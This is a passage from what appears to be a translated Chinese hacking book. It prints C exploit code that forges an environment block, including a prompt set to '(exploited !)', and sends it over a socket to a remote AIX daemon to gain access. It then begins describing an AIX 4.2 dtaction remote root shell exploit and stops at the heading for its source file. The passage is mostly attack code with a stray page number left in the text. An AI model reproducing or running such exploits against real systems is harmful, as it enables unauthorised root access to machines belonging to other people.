
```c
sprintf (buffer, "NLSPATH=%s", getenv("NLSPATH"));
send_environ (buffer, param);

sprintf (buffer, "PATH=%s", getenv("PATH"));
send_environ (buffer, param);

sprintf (buffer, "%s", "EDITOR=emacs");
send_environ (buffer, param);

sprintf (buffer, "LOGNAME=%s", LOGIN);
send_environ (buffer, param);

sprintf (buffer, "MAIL=/usr/spool/mail/%s", LOGIN);
send_environ (buffer, param);

sprintf (buffer, "HOSTNAME=%s", getenv("HOSTNAME"));
send_environ (buffer, param);

sprintf (buffer, "LOCPATH=%s", getenv("LOCPATH"));
send_environ (buffer, param);

sprintf (buffer, "%s", "PS1=(exploited !) ");
send_environ (buffer, param);

sprintf (buffer, "USER=%s", LOGIN);
send_environ (buffer, param);

sprintf (buffer, "AUTHSTATE=%s", getenv("AUTHSTATE"));
send_environ (buffer, param);

sprintf (buffer, "DISPLAY=%s", getenv("DISPLAY"));
send_environ (buffer, param);

sprintf (buffer, "SHELL=%s", getenv("SHELL"));
send_environ (buffer, param);

sprintf (buffer, "%s", "ODMDIR=/etc/objrepos");
send_environ (buffer, param);

sprintf (buffer, "HOME=%s", HOME);
send_environ (buffer, param);

sprintf (buffer, "%s", "TERM=vt220");
send_environ (buffer, param);

sprintf (buffer, "%s", "MAILMSG=[YOU HAVE NEW MAIL]");
send_environ (buffer, param);
sprintf (buffer, "PWD=%s", PWD);
send_environ (buffer, param);

sprintf (buffer, "%s", "T2=NFT-1");
send_environ (buffer, param);

sprintf (buffer, "%s", "A__z=! LOGNAME");
```

498

```c
send_environ(buffer,param);

/* 使用 -q 参数启动 info_gr，否则进程将在本地运行
   而不是从守护进程运行 ...  */

sprintf(buffer,"%%%c%%%c%%%c",1,45,113,0);
fwrite(buffer,1,4,param);

fclose(param);

param=fopen("/tmp/tempo.fun","rb");
fseek(param,0,SEEK_END);
taille_param=ftell(param);
fseek(param,0,SEEK_SET);
fread(paramz,1,taille_param,param);
fclose(param);

unlink("/tmp/tempo.fun");

/* 感谢守护进程先生 :) */

write(chaussette,paramz,taille_param);

printf("\n%s %s\n",OK,getenv("HOSTNAME"));

close(chaussette);
}
```

本章中的程序可以在随本书附赠的光盘中找到。

## 远程 root

*摘要：* AIX `dtaction` 和 `home` 环境处理存在远程 root shell 漏洞。

*黑客状态：* 未授权的 root 访问。

*易受攻击性：* AIX 4.2。

*攻击方式：* 使用 UNIX 专家 Georgi Guninski 编写的 `aixdttaction.c`，AIX 4.2 中的 `/usr/dt/bin/dtaction` 进程会处理“Home”环境，从而生成一个 root shell。

## aixdtaction.c
